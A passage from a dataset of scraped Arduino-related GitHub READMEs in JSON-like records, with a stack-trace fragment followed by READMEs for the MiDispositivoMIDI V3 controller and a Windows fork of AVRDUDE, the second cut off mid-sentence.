/home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/libraries/esp8266mdns/esp8266mdns.cpp:396\n0x402013d2: fs::file::close() at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/fs.cpp:251\n0x4020ebfd: settings::load() at /home/jan/devel/mqtt433gateway/.piolibdeps/arduinojson_id64/src/arduinojson/serialization/jsonserializerimpl.hpp:56\n0x40201864: print::println() at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/print.cpp:187\n0x4022b498: std::_function_handler<void (settings const&), void (*)(settings const&)>::_m_invoke(std::_any_data const&, settings const&) at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2069\n0x4022b1de: setup at /home/jan/devel/mqtt433gateway/src/mqtt433gateway.cpp:207\n0x4022a150: _m_manager at /home/jan/devel/mqtt433gateway/.piolibdeps/arduinojson_id64/src/arduinojson/serialization/jsonserializerimpl.hpp:56\n0x4022a4ec: _m_invoke at /home/jan/devel/mqtt433gateway/.piolibdeps/arduinojson_id64/src/arduinojson/serialization/jsonserializerimpl.hpp:56\n0x40202cfc: loop_wrapper at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/core_esp8266_main.cpp:57\n0x40204eb0: cont_norm at cont.o:?\nacknowledgement\nthis is heavily inspired by espexceptiondecoder.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000747, "year": null}, {"Unnamed: 0": 2814, "autor": 774, "date": null, "content": "\u2b50\ufe0f MiDispositivoMIDI V3 \u2b50\ufe0f\nThis repository is no longer officially maintained but feel free to open a pull request with your contribution. As we ran out of devices, we don't sell it anymore, but if you you want one you can find here all the schematics, manuals, documentations and code to build your own.\nConnect our device to your computer and start making music! Totally Plug&Play without any extra software, just your favourite MIDI sequencer (Logic, Ableto, Nuendo). It is not only a great tool for making music and experimenting, you can also use it to learn more about electronics, programming and Arduino. You have tons of code examples ready to load, but if you feel up to it, you can also contribute with your code. And last but not least! It is open source! You can either buy it at our website, our build it yourself, all the schematics and code are available in this repository.\n\u2764\ufe0f Follow us! \u2764\ufe0f\n\ud83d\udcb6 Want to buy the product? \ud83d\udcb6\n\ud83d\udcd7 Index \ud83d\udcd7\nAbout us \u2022 MiDispositivoMIDI V3 \u2022 Documentation \u2022 Expansions \u2022 FAQ \u2022 Contributing \u2022 License\nAbout us\nHi! We are BanaNut Electronics and we develop software and hardware for Arduino with educational purposes. We were born at the UPM University in Madrid during 2013 and we haven't stopped ever since.\nLightWand Kosmonaut V2 MiDispositivoMIDI V3\nEverything started with the first version at the Polytechnical University of Madrid (UPM) in 2013. We were a couple of young students interested in music and electronics, and we came up with this idea. We started reusing some hardware, mainly found at SparkFun's website, but only one year later, we had the second version that was fully designed by us. After some trial and error and feedback from users and friends, we released this third version V3 in 2017. We not only released the code, but also we started producing devices and selling them on the internet, first in our web and later on at Tindie.com store.\nDuring the years, the different versions of MiDispositivoMIDI have been used by many people, engineers, musicians and even kids. We gave some workshops at UPM Madrid for students in Electrical and Telecommunications Engineering, where we gave all the materials and the students had to solder, assembly and code the device.\nMiDispositivoMIDI V3\nWe are proud to present the MiDispositivoMIDI V3, which is the latest version we have out in the market (Jan 2019). MiDispositivoMIDI is an open source MIDI controller based on Arduino. In other words, its a small device with tons of LEDs and buttons, that you can connect to your computer to, in example, make music. Our device works with the MIDI protocol, a very well known protocol used in the music industry. You can just plug our device and start using it with your favourite DAW, such as Logic, Ableton or Cubase. No other extra softare is needed.\nIf you are also interested in programming and electronics, this device offer you a great tool to learn by example. You can also use it to prototype and play around. And also, since it is open source you can fully costumize it to your needs. If you don't know much about coding, just load the codes that we provide, and use them. But if you like coding, you can also publish your code with new features or improvements for others to use.\nThese are the features of our device:\nPlug & Play MIDI device.\nOpen source based on Arduino.\nHave 16 pad buttons in a 4x4 matrix.\nHave 2 lateral buttons.\nHave RGB leds with 256 levels of intensity of each color.\nMicro USB connection.\nDimensions of 10x10 cm.\nModular design. Connect up to 4 devices.\nFully compatible with Logic, Ableton or Cubase.\nWe invite you to check our YouTube channel, where we post videos about our devices. You can also follow other social networks such as Instagram o Facebook.\nhttps://www.youtube.com/watch?v=3QnzLwpbpRE&t\nhttps://www.youtube.com/watch?v=8WFfShg-0Dk\nhttps://www.youtube.com/watch?v=2y8fhmTmedI\nhttps://www.youtube.com/watch?v=TsuVpFoLFyI\nDocumentation\nWe provide a C++ Arduino library that you can use with our device, that simplifies the tasks of handling the LEDs and buttons. The code is self documented, but we have also written a nice Wiki page where you can find more information about the hardware, some hints about MIDI protocol and some low level software examples in Arduino, that will allow you to understand how it works:\nWiki: https://github.com/Bananut-Electronics/MiDispositivoMIDI_V3/wiki\nTODO: Write some nice code snippets\n//TODO\nExpansions\nOur device has a modular design, which means that with the same hardware, you can add modules to convert it into a bigger controller. For example, if you put four MiDispositivoMIDI V3 into a 8x8 configuration, you will have 64 buttons. All this can be done using the same hardware and with very few modificatons in the code. Note that you can also replace a 4x4 button matrix by a 4x4 potentiometer matrix, but this feature is not implemented yet.\n4x16 Configuration\nYou can connect 4 MiDispositivoMIDI V3 in a 4x16 configuration to get the following. With something like this, you can, for example, create an step sequencer. See this video for an example:\nhttps://www.youtube.com/watch?v=bYyvVDn-gKs\n8x8 Configuration\nSame as before, you can connect the devices with a different configuration. Note that the connections are done under the PCB with an extra PCB, so no extra wiring is needed.\n4x8 Configuration\nTODO\nPotentiometer Expansion\nTODO\nFAQ\nFeel free to send us a mail to bananutelectronics@gmail.com if you have any question, but read before our FAQ since there are some common issues that can be fixed quite easily:\nI can't load code to my device. Why? Make sure that in the Arduino IDE boards section (Tool->Boards) you have selected \"Arduino Leonardo\"\nI was playing with some code, and now the device is gone form the serial port list. Why? If you were playing with some experimental code, you might have screwed up the \"operative system\" of the Arduino. But no worries, the fix is pretty straightforward. Open an example from the basic library (i.e. Examples->Basics-Blink) and hit the \"Upload\" button. You will first see that it is \"Compiling\" and that that is \"Loading\". Click the reset button right after \"Compiling\" is finished. With this you should get the bootloader running and you will be able to load the code. After this, you should be able to see the device in the serial port list as usual. Note that the reset button is the one on the top (not the ones on the left).\nWhen I press a button, the LED takes a bit to light up, why? There should not be any delay when you press a button, so right after pressing the pad, you should see that it lights up (assuming of course that it configured to do so). If this delay is present, please, make sure that you have a MIDI program reading the port in your computer.\nContributing\nFeel free to create a pull request with your new feature, we will be pleased to add it to our repo. We can differentiate between three different types of contributions:\nContributing to the Arduino library: Feel free to add stuff related to our Arduino library in the src folder. Note that if you add a new feature to our library, we would love to see also a working example in the examples folder using that new functionality. Name if as MDM_V3_Library_xxx so that we know that that code uses the library.\nContributing with new examples: You can add code inside the examples folder. Just remember to name it with MDM_V3_NoLibrary_xxx if that code is not using any function provided by the library.\nOther random stuff: Feel free to add images with your own setup, correct existing code, fix bugs or whatever you have in mind.\nLicense\nMiDispositivoMIDI by Alvaro Lopez & Pablo de Miguel Morales is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.\nContributors \u2728\nThanks goes to these wonderful people (emoji key):\nPablo Alonso\n\ud83d\udcbb\nper1234\n\ud83d\udcbb\nThis project follows the all-contributors specification. Contributions of any kind welcome!", "link": "https://github.com/Bananut-Electronics/MiDispositivoMIDI_V3", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "\u2b50\ufe0f midispositivomidi v3 \u2b50\ufe0f\nthis repository is no longer officially maintained but feel free to open a pull request with your contribution. as we ran out of devices, we don't sell it anymore, but if you you want one you can find here all the schematics, manuals, documentations and code to build your own.\nconnect our device to your computer and start making music! totally plug&play without any extra software, just your favourite midi sequencer (logic, ableto, nuendo). it is not only a great -----> tool !!!  for making music and experimenting, you can also use it to learn more about electronics, programming and arduino. you have tons of code examples ready to load, but if you feel up to it, you can also contribute with your code. and last but not least! it is open source! you can either buy it at our website, our build it yourself, all the schematics and code are available in this repository.\n\u2764\ufe0f follow us! \u2764\ufe0f\n\ud83d\udcb6 want to buy the product? \ud83d\udcb6\n\ud83d\udcd7 index \ud83d\udcd7\nabout us \u2022 midispositivomidi v3 \u2022 documentation \u2022 expansions \u2022 faq \u2022 contributing \u2022 license\nabout us\nhi! we are bananut electronics and we develop software and hardware for arduino with educational purposes. we were born at the upm university in madrid during 2013 and we haven't stopped ever since.\nlightwand kosmonaut v2 midispositivomidi v3\neverything started with the first version at the polytechnical university of madrid (upm) in 2013. we were a couple of young students interested in music and electronics, and we came up with this idea. we started reusing some hardware, mainly found at sparkfun's website, but only one year later, we had the second version that was fully designed by us. after some trial and error and feedback from users and friends, we released this third version v3 in 2017. we not only released the code, but also we started producing devices and selling them on the internet, first in our web and later on at tindie.com store.\nduring the years, the different versions of midispositivomidi have been used by many people, engineers, musicians and even kids. we gave some workshops at upm madrid for students in electrical and telecommunications engineering, where we gave all the materials and the students had to solder, assembly and code the device.\nmidispositivomidi v3\nwe are proud to present the midispositivomidi v3, which is the latest version we have out in the market (jan 2019). midispositivomidi is an open source midi controller based on arduino. in other words, its a small device with tons of leds and buttons, that you can connect to your computer to, in example, make music. our device works with the midi protocol, a very well known protocol used in the music industry. you can just plug our device and start using it with your favourite daw, such as logic, ableton or cubase. no other extra softare is needed.\nif you are also interested in programming and electronics, this device offer you a great tool to learn by example. you can also use it to prototype and play around. and also, since it is open source you can fully costumize it to your needs. if you don't know much about coding, just load the codes that we provide, and use them. but if you like coding, you can also publish your code with new features or improvements for others to use.\nthese are the features of our device:\nplug & play midi device.\nopen source based on arduino.\nhave 16 pad buttons in a 4x4 matrix.\nhave 2 lateral buttons.\nhave rgb leds with 256 levels of intensity of each color.\nmicro usb connection.\ndimensions of 10x10 cm.\nmodular design. connect up to 4 devices.\nfully compatible with logic, ableton or cubase.\nwe invite you to check our youtube channel, where we post videos about our devices. you can also follow other social networks such as instagram o facebook.\nhttps://www.youtube.com/watch?v=3qnzlwpbpre&t\nhttps://www.youtube.com/watch?v=8wffshg-0dk\nhttps://www.youtube.com/watch?v=2y8fhmtmedi\nhttps://www.youtube.com/watch?v=tsuvpfolfyi\ndocumentation\nwe provide a c++ arduino library that you can use with our device, that simplifies the tasks of handling the leds and buttons. the code is self documented, but we have also written a nice wiki page where you can find more information about the hardware, some hints about midi protocol and some low level software examples in arduino, that will allow you to understand how it works:\nwiki: https://github.com/bananut-electronics/midispositivomidi_v3/wiki\ntodo: write some nice code snippets\n//todo\nexpansions\nour device has a modular design, which means that with the same hardware, you can add modules to convert it into a bigger controller. for example, if you put four midispositivomidi v3 into a 8x8 configuration, you will have 64 buttons. all this can be done using the same hardware and with very few modificatons in the code. note that you can also replace a 4x4 button matrix by a 4x4 potentiometer matrix, but this feature is not implemented yet.\n4x16 configuration\nyou can connect 4 midispositivomidi v3 in a 4x16 configuration to get the following. with something like this, you can, for example, create an step sequencer. see this video for an example:\nhttps://www.youtube.com/watch?v=byyvvdn-gks\n8x8 configuration\nsame as before, you can connect the devices with a different configuration. note that the connections are done under the pcb with an extra pcb, so no extra wiring is needed.\n4x8 configuration\ntodo\npotentiometer expansion\ntodo\nfaq\nfeel free to send us a mail to bananutelectronics@gmail.com if you have any question, but read before our faq since there are some common issues that can be fixed quite easily:\ni can't load code to my device. why? make sure that in the arduino ide boards section (tool->boards) you have selected \"arduino leonardo\"\ni was playing with some code, and now the device is gone form the serial port list. why? if you were playing with some experimental code, you might have screwed up the \"operative system\" of the arduino. but no worries, the fix is pretty straightforward. open an example from the basic library (i.e. examples->basics-blink) and hit the \"upload\" button. you will first see that it is \"compiling\" and that that is \"loading\". click the reset button right after \"compiling\" is finished. with this you should get the bootloader running and you will be able to load the code. after this, you should be able to see the device in the serial port list as usual. note that the reset button is the one on the top (not the ones on the left).\nwhen i press a button, the led takes a bit to light up, why? there should not be any delay when you press a button, so right after pressing the pad, you should see that it lights up (assuming of course that it configured to do so). if this delay is present, please, make sure that you have a midi program reading the port in your computer.\ncontributing\nfeel free to create a pull request with your new feature, we will be pleased to add it to our repo. we can differentiate between three different types of contributions:\ncontributing to the arduino library: feel free to add stuff related to our arduino library in the src folder. note that if you add a new feature to our library, we would love to see also a working example in the examples folder using that new functionality. name if as mdm_v3_library_xxx so that we know that that code uses the library.\ncontributing with new examples: you can add code inside the examples folder. just remember to name it with mdm_v3_nolibrary_xxx if that code is not using any function provided by the library.\nother random stuff: feel free to add images with your own setup, correct existing code, fix bugs or whatever you have in mind.\nlicense\nmidispositivomidi by alvaro lopez & pablo de miguel morales is licensed under a creative commons attribution-noncommercial-sharealike 4.0 international license.\ncontributors \u2728\nthanks goes to these wonderful people (emoji key):\npablo alonso\n\ud83d\udcbb\nper1234\n\ud83d\udcbb\nthis project follows the all-contributors specification. contributions of any kind welcome!", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000774, "year": null}, {"Unnamed: 0": 2841, "autor": 801, "date": null, "content": "AVRDUDE for Windows\nThis is a fork of AVRDUDE 6.3 from https://www.nongnu.org/avrdude/.\nThe purpose of this fork is to add better support for Windows to bring it on par with the Linux version of AVRDUDE.\nNoteable changes include:\nSupport Atmel AVR programmers out of the box\nSupport Micronucleus bootloader\nSupport Teensy HalfKay bootloader\nSupport COM port discovery via USB VID/PID\nSupport Arduino Leonardo bootloader auto-reset\nSupport WinUSB devices via custom libusb\nSupport FTDI devices via custom libftdi\nSupport HID devices via libhidapi\nSupport Visual Studio\nMiscellaneous bug-fixes and patches\nThe original AVRDUDE project homepage can be found here https://savannah.nongnu.org/projects/avrdude.\nDownload\nTo get the latest version of AVRDUDE for Windows, go to the releases folder:\nhttps://github.com/mariusgreuel/avrdude/releases\nFeature Details\nSupport Atmel AVR programmers out of the box\nThis build contains support for Atmel AVR programmers, such as\nAtmel-ICE (Part Number: ATATMEL-ICE)\nAtmel AVRISP mkII (Part Number: ATAVRISP2)\nThis build does not rely on libusb drivers. Instead the default Atmel drivers can be used, allowing you to use AVRDUDE and Atmel Studio 7 side-by-side, without switching drivers.\nIf you previously changed the driver of your programmer to libusb, you should use Windows Device Manager to uninstall the device, and then reinstall using the default Windows drivers.\nSupport Micronucleus bootloader\nThis build adds support for the Micronucleus bootloader, so you do no longer need a separate command-line utility when working with devices that use the Micronucleus bootloader.\nThe Micronucleus bootloader is typically used on small ATtiny boards, such as Digispark (ATtiny85), Digispark Pro (ATtiny167), and the respective clones. By default, it uses the USB VID/PID 16D0:0753 (MCS Digistump).\nSince this bootloader is optimized for size, it implements writing to flash memory only. As it does not support reading, you need to use the -V option to prevent AVRDUDE from verifing the flash memory. To have AVRDUDE wait for the device to be connected, use the extended option '-x wait'.\nExample: Flashing a Micronucleus bootloader device\navrdude -c micronucleus -p t85 -x wait -V -U flash:w:main.hex:i\nSupport Teensy HalfKay bootloader\nThis build adds support for the Teensy HalfKay bootloader, so you do no longer need a the Teensy Loader tool when working with Teensy devices.\nSince this bootloader is optimized for size, it implements writing to flash memory only. As it does not support reading, you need to use the -V option to prevent AVRDUDE from verifing the flash memory. To have AVRDUDE wait for the device to be connected, use the extended option '-x wait'.\nSupported devices are:\nTeensy 1.0 (AT90USB162)\nTeensy 2.0 (ATmega32U4)\nTeensy++ 1.0 (AT90USB646)\nTeensy++ 2.0 (AT90USB1286)\nExample: Flashing a Teensy 2.0 device\navrdude -c teensy -p m32u4 -x wait -V -U flash:w:main.hex:i\nSupport COM port discovery via USB VID/PID\nMost Arduino boards use a USB-based virtual COM port, which is connected to some sort of bootloader. Since COM port numbers (COM1, COM2, ...) are determined by Windows, you first need to use Windows device manager to figure out the COM port before you can use AVRDUDE to flash the board. Alternatively, you may use Windows device manager to assign a COM port of your choice to the USB device. Additionally, the COM port of your Arduino board may change over time, for instance if you plug the device in a different USB port.\nTo simplify the discovery of your Arduino board, I provided the possibility to specify the USB vendor and product ID instead of the COM port.\nFor instance, to connect to an Arduino Leonardo, use the following command:\navrdude -c avr109 -P usb:2341:0036 -p m32u4\nSince the USB vendor and device ID 2341:0036 is the identical for all Leonardo boards, the command above will work regardless of which COM port was actually assigned to your board.\nNote that can cannot use this method if you have more than one device of the same type (i.e. that share the same USB VID/PID) plugged into your computer. Also, some devices ship various versions of firmwares using different VID/PID.\nTo figure out the USB VID and PID, you may use Windows devices manager (see the Hardware IDs of the Details tab of the USB device), or look it up in the official list of Arduino devices: https://github.com/arduino/ArduinoCore-avr/blob/master/boards.txt\nUSB VID/PID pairs for some popular boards and the respective commands are:\nArduino Uno Rev 3: 2A03:0043 -> avrdude -c arduino -P usb:2A03:0043 -p m328p\nArduino Micro: 2341:0037 -> avrdude -c avr109 -P usb:2341:0037 -p m32u4\nArduino Leonardo: 2341:0036 -> avrdude -c avr109 -P usb:2341:0036 -p m32u4\nSparkfun Pro Micro (5V): 1B4F:9205 -> avrdude -c avr109 -P usb:1B4F:9205 -p m32u4\nSparkfun Pro Micro (3.3V): 1B4F:9203 -> avrdude -c avr109 -P usb:1B4F:9203 -p m32u4\nAdafruit Circuit Playground: 239A:0011 -> avrdude -c avr109 -P usb:239A:0011 -p m32u4\nSupport Arduino Leonardo bootloader auto-reset\nBefore any Arduino board may be flashed via the bootloader, you need to kick it into bootloader mode first. This can done manually by pressing the reset button, or automatically via an special auto-reset mechanism: For boards with a USB to serial converter chip (such as Arduino Uno or Nano), the tool needs to pull the DTR signal to low, which will briefly pull the RESET pin of the microcontroller to low. For boards with a direct USB connection (such as Arduino Leonardo or Micro), the sketch typically implements a serial port via a USB composite device with a virtual COM port. To perform the auto-reset, the sketch implements a hack that resets the device into bootloader mode when the COM port is opened with a baudrate of 1200bps. To make matters even more complicated, the bootloader COM port has a different USB VID:PID pair than the sketch COM port, which causes the COM port to change while performing the reset.\nTo simplify the process of auto-resetting the board, this version will auto-reset the device when AVRDUDE detects that the device is running in sketch mode. Note that the sketch is required to implement a USB composite device with a virtual COM port with a matching USB VID:PID, which is implemented in the Arduino core software.\nSupport WinUSB devices via custom libusb\nSince AVRDUDE originated from Unix, the USB support in AVRDUDE is built upon the Unix-based USB library libusb. In order to support Windows, libusb has been ported to Windows libusb-win32.\nThe downside of using libusb-win32 is that it requires the user to manually install a kernel-mode driver (libusb0.sys or libusbk.sys) instead of the manufacturer supplied Windows driver. There are several hacks to accomplish this, such as the Zadig driver installation utility, which installs a self-signed root certificate in the Windows driver store due to the lack of proper driver installation packages.\nThis build contains a custom library called libwinusb, which implements a sub-set of the libusb-win32 API. The libwinusb implementation supports both the winusb.sys driver, and the libusb0.sys driver as well. This patch has a number of advantages, such as\nMany USB devices that ship with WinUSB drivers, such as Atmel programmer, will run out of the box.\nWorks with both WinUSB and libusb: You can use either Windows built-in WinUSB driver to access your USB devices, or keep using the libusb drivers if you have them installed already.\nNo static dependency to libusb0.dll: You cannot run the original version AVRDUDE, unless you previously installed libusb. On systems where libusb is not installed, this build eliminates the error \"The code execution cannot proceed because libusb0.dll was not found. Reinstalling the program may fix this problem\".\nMicrosoft OS descriptors and firmware examples\nWindows provides a mechanism to automatically load the built-in WinUSB driver without providing a driver installation package (INF file). The automatic WinUSB driver installation is triggered via a special Microsoft OS descriptor that must be present in the firmware of the USB device.\nTo demonstrate how this works, I added Microsoft OS descriptors to the following projects:\nUSBasp - USB programmer for Atmel AVR controllers: https://github.com/mariusgreuel/USBasp\nFabISP a.k.a USBtinyISP - A fab-able in-system programmer: https://github.com/mariusgreuel/FabISP\nMicronucleus - ATtiny USB bootloader with a strong emphasis on bootloader compactness: https://github.com/mariusgreuel/micronucleus\nSupport FTDI devices via custom libftdi\nIn order to support FTDI devices, AVRDUDE uses the Unix-based library libftdi1. Similar to libusb, the libftdi1 library does not play nice on Windows: On Windows, FTDI devices load the manufacturer supplied driver via plug-and-play. The FTDI drivers implement an API via the FTDI D2XX DLLs. However, libftdi1 cannot use the D2XX interface, so it will not work with the plug-and-play drivers.\nThis build contains a patches library of libftdi. The patches load the D2XX DLLs to support FTDI devices, so FTDI devices will just work.\nSupport HID devices via libhidapi\nThis build include the WIN32 version of libhidapi, and some patches, to allow HID devices to work out of the box.\nSupport Visual Studio\nThis build adds support for Microsoft Visual Studio. Building AVRDUDE with Microsoft Visual C/C++ will give you the best user and debugging experience while working on Windows.\nMiscellaneous bug-fixes and patches\nThis build fixes bug #54159: Buffer overflow in usbtiny.c, which causes AVRDUDE to crash when using the USBtiny programmer.\nSupport new microcontroller: ATtiny167\nReleases\nYou can find the latest releases of AVRDUDE for Windows here:\nhttps://github.com/mariusgreuel/avrdude/releases\nUsers manual\nYou can find the original users manual (does not contain AVRDUDE for Windows extras) of AVRDUDE here:\nhttps://www.nongnu.org/avrdude/user-manual/avrdude.html\nBuild\nBuilding AVRDUDE for Windows\nWindows Prerequisites\nIn order to build AVRDUDE on Windows, you need:\nMicrosoft Visual Studio 2019 with 'Desktop development with C++' enabled\nWindows Build Instructions\nTo build AVRDUDE on Windows, do the following:\ngit clone --branch windows https://github.com/mariusgreuel/avrdude\nOpen the solution avrdude.sln and build the project.\nNote: The folder msvc\\generated includes pre-built files from the AVRDUDE configure and grammar generation.\nBuilding AVRDUDE for Linux\nNote that the AVRDUDE for Linux version does not contain all extra Windows features. The features that have been added to the stock version of AVRDUDE include:\nSupport Micronucleus bootloader\nSupport Teensy HalfKay bootloader\nLinux Prerequisites\nIn order to build AVRDUDE on Linux, you need to install the following packages:\nsudo apt install git make gcc automake libtool flex bison libelf-dev libusb-dev libftdi1-dev libhidapi-dev\nLinux Build Instructions\nTo build AVRDUDE on Linux, run the following commands:\ngit clone --branch windows https://github.com/mariusgreuel/avrdude\ncd avrdude\n./bootstrap\n./configure\nmake\nTo install a local build of AVRDUDE on your system, run the following command:\nsudo make install\nLinux udev rules\nIf you intent to use either the Micronucleus or Teensy bootloader, you should edit the udev rules so that you can run AVRDUDE without root.\nFor instance, if you are on Ubuntu and you installed the avrdude package, you would edit /lib/udev/rules.d/60-avrdude.rules and add the following rules:\n# Micronucleus Bootloader\nSUBSYSTEM==\"usb\", ATTR{idVendor}==\"16d0\", ATTR{idProduct}==\"0753\", TAG+=\"uaccess\"\n# Teensy Bootloader\nSUBSYSTEM==\"usb\", ATTR{idVendor}==\"16c0\", ATTR{idProduct}==\"0478\", TAG+=\"uaccess\"\nTroubleshooting Tips & Tricks\nAtmel DFU Device driver broken\nThe current version of the Atmel DFU drivers that are distributed via the Windows Update are goofed up (@Atmel: It might have something to do with the fact that you commented out the CopyFiles sections!). Symptoms are:\nYou cannot use AVRDUDE to connect to an Atmel DFU device, and you get the error message \"No matching USB device found\".\nWhen installing the drivers via Windows Update, you get the error message \"Windows encountered a problem installing the drivers for your device\" and \"A service installation section in this INF is invalid.\"\nIn Windows Device Manager, the Atmel DFU device shows up as an unknown device.\nYou should use an older driver package that does not contain this bug.\nOutdated libusb0 driver\nThe most current version of libusb0.sys is 1.2.6.0, signed on 12/17/2012 by Travis Lee Robinson. If you are using an older version (check with Windows Device Manager), you may not be able to connect to your USB devices using the libusb0 driver.\nLicense\nAVRDUDE is licensed under the GNU GPLv2.", "link": "https://github.com/mariusgreuel/avrdude", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "avrdude for windows\nthis is a fork of avrdude 6.3 from https://www.nongnu.org/avrdude/.\nthe purpose of this fork is to add better support for windows to bring it on par with the linux version of avrdude.\nnoteable changes include:\nsupport atmel avr programmers out of the box\nsupport micronucleus bootloader\nsupport teensy halfkay bootloader\nsupport com port discovery via usb vid/pid\nsupport arduino leonardo bootloader auto-reset\nsupport winusb devices via custom libusb\nsupport ftdi devices via custom libftdi\nsupport hid devices via libhidapi\nsupport visual studio\nmiscellaneous bug-fixes and patches\nthe original avrdude project homepage can be found here https://savannah.nongnu.org/projects/avrdude.\ndownload\nto get the latest version of avrdude for windows, go to the releases folder:\nhttps://github.com/mariusgreuel/avrdude/releases\nfeature details\nsupport atmel avr programmers out of the box\nthis build contains support for atmel avr programmers, such as\natmel-ice (part number: atatmel-ice)\natmel avrisp mkii (part number: atavrisp2)\nthis build does not rely on libusb drivers. instead the default atmel drivers can be used, allowing you to use avrdude and atmel studio 7 side-by-side, without switching drivers.\nif you previously changed the driver of your programmer to libusb, you should use windows device manager to uninstall the device, and then reinstall using the default windows drivers.\nsupport micronucleus bootloader\nthis build adds support for the micronucleus bootloader, so you do no longer need a separate command-line utility when working with devices that use the micronucleus bootloader.\nthe micronucleus bootloader is typically used on small attiny boards, such as digispark (attiny85), digispark pro (attiny167), and the respective clones. by default, it uses the usb vid/pid 16d0:0753 (mcs digistump).\nsince this bootloader is optimized for size, it implements writing to flash memory only. as it does not support reading, you need to use the -v option to prevent avrdude from verifing the flash memory. to have avrdude wait for the device to be connected, use the extended option '-x wait'.\nexample: flashing a micronucleus bootloader device\navrdude -c micronucleus -p t85 -x wait -v -u flash:w:main.hex:i\nsupport teensy halfkay bootloader\nthis build adds support for the teensy halfkay bootloader, so you do no longer need a the teensy loader -----> tool !!!  when working with teensy devices.\nsince this bootloader is optimized for size, it implements writing to flash memory only. as it does not support reading, you need to use the -v option to prevent avrdude from verifing the flash memory. to have avrdude wait for the device to be connected, use the extended option '-x wait'.\nsupported devices are:\nteensy 1.0 (at90usb162)\nteensy 2.0 (atmega32u4)\nteensy++ 1.0 (at90usb646)\nteensy++ 2.0 (at90usb1286)\nexample: flashing a teensy 2.0 device\navrdude -c teensy -p m32u4 -x wait -v -u flash:w:main.hex:i\nsupport com port discovery via usb vid/pid\nmost arduino boards use a usb-based virtual com port, which is connected to some sort of bootloader. since com port numbers (com1, com2, ...) are determined by windows, you first need to use windows device manager to figure out the com port before you can use avrdude to flash the board. alternatively, you may use windows device manager to assign a com port of your choice to the usb device. additionally, the com port of your arduino board may change over time, for instance if you plug the device in a different usb port.\nto simplify the discovery of your arduino board, i provided the possibility to specify the usb vendor and product id instead of the com port.\nfor instance, to connect to an arduino leonardo, use the following command:\navrdude -c avr109 -p usb:2341:0036 -p m32u4\nsince the usb vendor and device id 2341:0036 is the identical for all leonardo boards, the command above will work regardless of which com port was actually assigned to your board.\nnote that can cannot use this method if you have more than one device of the same type (i.e. that share the same usb vid/pid) plugged into your computer. also, some devices ship various versions of firmwares using different vid/pid.\nto figure out the usb vid and pid, you may use windows devices manager (see the hardware ids of the details tab of the usb device), or look it up in the official list of arduino devices: https://github.com/arduino/arduinocore-avr/blob/master/boards.txt\nusb vid/pid pairs for some popular boards and the respective commands are:\narduino uno rev 3: 2a03:0043 -> avrdude -c arduino -p usb:2a03:0043 -p m328p\narduino micro: 2341:0037 -> avrdude -c avr109 -p usb:2341:0037 -p m32u4\narduino leonardo: 2341:0036 -> avrdude -c avr109 -p usb:2341:0036 -p m32u4\nsparkfun pro micro (5v): 1b4f:9205 -> avrdude -c avr109 -p usb:1b4f:9205 -p m32u4\nsparkfun pro micro (3.3v): 1b4f:9203 -> avrdude -c avr109 -p usb:1b4f:9203 -p m32u4\nadafruit circuit playground: 239a:0011 -> avrdude -c avr109 -p usb:239a:0011 -p m32u4\nsupport arduino leonardo bootloader auto-reset\nbefore any arduino board may be flashed via the bootloader, you need to kick it into bootloader mode first. this can done manually by pressing the reset button, or automatically via an special auto-reset mechanism: for boards with a usb to serial converter chip (such as arduino uno or nano), the tool needs to pull the dtr signal to low, which will briefly pull the reset pin of the microcontroller to low. for boards with a direct usb connection (such as arduino leonardo or micro), the sketch typically implements a serial port via a usb composite device with a virtual com port. to perform the auto-reset, the sketch implements a hack that resets the device into bootloader mode when the com port is opened with a baudrate of 1200bps. to make matters even more complicated, the bootloader com port has a different usb vid:pid pair than the sketch com port, which causes the com port to change while performing the reset.\nto simplify the process of auto-resetting the board, this version will auto-reset the device when avrdude detects that the device is running in sketch mode. note that the sketch is required to implement a usb composite device with a virtual com port with a matching usb vid:pid, which is implemented in the arduino core software.\nsupport winusb devices via custom libusb\nsince avrdude originated from unix, the usb support in avrdude is built upon the unix-based usb library libusb. in order to support windows, libusb has been ported to windows libusb-win32.\nthe downside of using libusb-win32 is that it requires the user to manually install a kernel-mode driver (libusb0.sys or libusbk.sys) instead of the manufacturer supplied windows driver. there are several hacks to accomplish this, such as the zadig driver installation utility, which installs a self-signed root certificate in the windows driver store due to the lack of proper driver installation packages.\nthis build contains a custom library called libwinusb, which implements a sub-set of the libusb-win32 api. the libwinusb implementation supports both the winusb.sys driver, and the libusb0.sys driver as well. this patch has a number of advantages, such as\nmany usb devices that ship with winusb drivers, such as atmel programmer, will run out of the box.\nworks with both winusb and libusb: you can use either windows built-in winusb driver to access your usb devices, or keep using the libusb drivers if you have them installed already.\nno static dependency to libusb0.dll: you cannot run the original version avrdude, unless you previously installed libusb. on systems where libusb is not installed, this build eliminates the error \"the code execution cannot proceed because libusb0.dll was not found. reinstalling the program may fix this problem\".\nmicrosoft os descriptors and firmware examples\nwindows provides a mechanism to automatically load the built-in winusb driver without providing a driver installation package (inf file). the automatic winusb driver installation is triggered via a special microsoft os descriptor that must be present in the firmware of the usb device.\nto demonstrate how this works, i added microsoft os descriptors to the following projects:\nusbasp - usb programmer for atmel avr controllers: https://github.com/mariusgreuel/usbasp\nfabisp a.k.a usbtinyisp - a fab-able in-system programmer: https://github.com/mariusgreuel/fabisp\nmicronucleus - attiny usb bootloader with a strong emphasis on bootloader compactness: https://github.com/mariusgreuel/micronucleus\nsupport ftdi devices via custom libftdi\nin order to support ftdi devices, avrdude uses the unix-based library libftdi1. similar to libusb, the libftdi1 library does not play nice on windows: on windows, ftdi devices load the manufacturer supplied driver via plug-and-play. the ftdi 